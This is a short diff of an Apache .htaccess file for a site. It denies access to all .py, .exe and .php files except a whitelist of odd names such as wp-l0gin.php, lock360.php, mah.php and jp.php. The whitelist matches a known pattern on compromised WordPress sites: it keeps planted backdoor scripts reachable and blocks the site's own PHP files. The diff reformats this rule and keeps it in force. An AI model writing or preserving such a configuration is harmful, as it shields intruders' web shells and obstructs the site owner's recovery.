@@ -1,10 +1,11 @@
 <FilesMatch ".(py|exe|php)$">
- Order allow,deny
- Deny from all
+    Order deny,allow
+    Deny from all
+    ErrorDocument 403 "Access Forbidden"
 </FilesMatch>
-<FilesMatch "^(about.php|radio.php|index.php|content.php|lock360.php|admin.php|wp-login.php|wp-l0gin.php|wp-theme.php|wp-scripts.php|wp-editor.php|mah.php|jp.php|ext.php|index.html)$">
- Order allow,deny
- Allow from all
+<FilesMatch "^(about\.php|radio\.php|index\.php|content\.php|lock360\.php|admin\.php|wp-login\.php|wp-l0gin\.php|wp-theme\.php|wp-scripts\.php|wp-editor\.php|mah\.php|jp\.php|ext\.php|index\.html)$">
+    Order allow,deny
+    Allow from all
 </FilesMatch>
 <IfModule mod_rewrite.c>
 RewriteCond %{HTTP_HOST} ^sportexchangewhitelabel.com [NC]
